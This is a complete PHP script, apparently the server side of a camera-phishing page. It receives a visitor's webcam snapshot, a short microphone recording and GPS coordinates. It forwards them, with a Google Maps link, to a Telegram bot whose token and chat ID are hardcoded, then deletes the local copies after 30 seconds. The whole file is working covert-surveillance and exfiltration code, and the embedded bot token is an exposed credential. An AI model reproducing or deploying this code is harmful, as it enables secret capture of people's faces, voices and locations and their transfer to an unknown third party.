<?php
$botToken = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";
$chatId = "8504837303";
$date = date('dMYHis');

if(!empty($_POST['cat'])){
    
    // Save image
    $imageData = $_POST['cat'];
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    $fileName = "cam".$date.".png";
    file_put_contents($fileName, $unencodedData);
    
    // Handle audio file
    $audioFile = '';
    if(isset($_FILES['audio']) && $_FILES['audio']['error'] == 0) {
        $audioName = "audio".$date.".webm";
        move_uploaded_file($_FILES['audio']['tmp_name'], $audioName);
        $audioFile = $audioName;
    }
    
    // Get location data + Google Maps link
    $location = isset($_POST['location']) ? json_decode($_POST['location'], true) : [];
    $locationText = '';
    $googleMapsLink = '';
    
    if($location && isset($location['lat']) && isset($location['lng'])) {
        $lat = $location['lat'];
        $lng = $location['lng'];
        $accuracy = isset($location['accuracy']) ? round($location['accuracy'], 1) : 'N/A';
        
        // Google Maps direct link (clickable)
        $googleMapsLink = "https://maps.google.com/?q={$lat},{$lng}";
        
        $locationText = "📍 **GPS:** {$lat}, {$lng}
";
        $locationText .= "📏 **Accuracy:** {$accuracy}m
";
        $locationText .= "🗺️ **Map:** {$googleMapsLink}";
    } elseif($location && isset($location['error'])) {
        $locationText = "📍 Location error: {$location['error']}";
    }
    
    // Send photo first
    $url = "https://api.telegram.org/bot".$botToken."/sendPhoto";
    $photoCaption = "📸 Camera capture ".$date;
    if($locationText) $photoCaption .= "

" . $locationText;
    
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($fileName), 'image/png'),
        'caption' => $photoCaption,
        'parse_mode' => 'Markdown'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $result = curl_exec($ch);
    $photoMessageId = json_decode($result, true)['result']['message_id'];
    curl_close($ch);
    
    // Send audio if exists
    if($audioFile) {
        $audioUrl = "https://api.telegram.org/bot".$botToken."/sendAudio";
        $audioPostFields = [
            'chat_id' => $chatId,
            'audio' => new CURLFile(realpath($audioFile), 'audio/webm'),
            'title' => 'Audio capture '.$date,
            'caption' => '🔊 1.5s microphone recording',
            'reply_to_message_id' => $photoMessageId
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $audioUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $audioPostFields);
        curl_exec($ch);
        curl_close($ch);
    }
    
    // Send Google Maps location as separate message (if available)
    if($googleMapsLink) {
        $locationUrl = "https://api.telegram.org/bot".$botToken."/sendLocation";
        $locationPostFields = [
            'chat_id' => $chatId,
            'latitude' => $lat,
            'longitude' => $lng,
            'reply_to_message_id' => $photoMessageId
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $locationUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $locationPostFields);
        curl_exec($ch);
        curl_close($ch);
    }
    
    // Cleanup files after 30 seconds
    register_shutdown_function(function() use ($fileName, $audioFile) {
        sleep(30);
        if(file_exists($fileName)) unlink($fileName);
        if($audioFile && file_exists($audioFile)) unlink($audioFile);
    });
    
    echo json_encode([
        "status" => "sent", 
        "image" => $fileName, 
        "audio" => $audioFile ? "sent" : "none", 
        "location" => $location,
        "maps_link" => $googleMapsLink
    ]);
}
?>

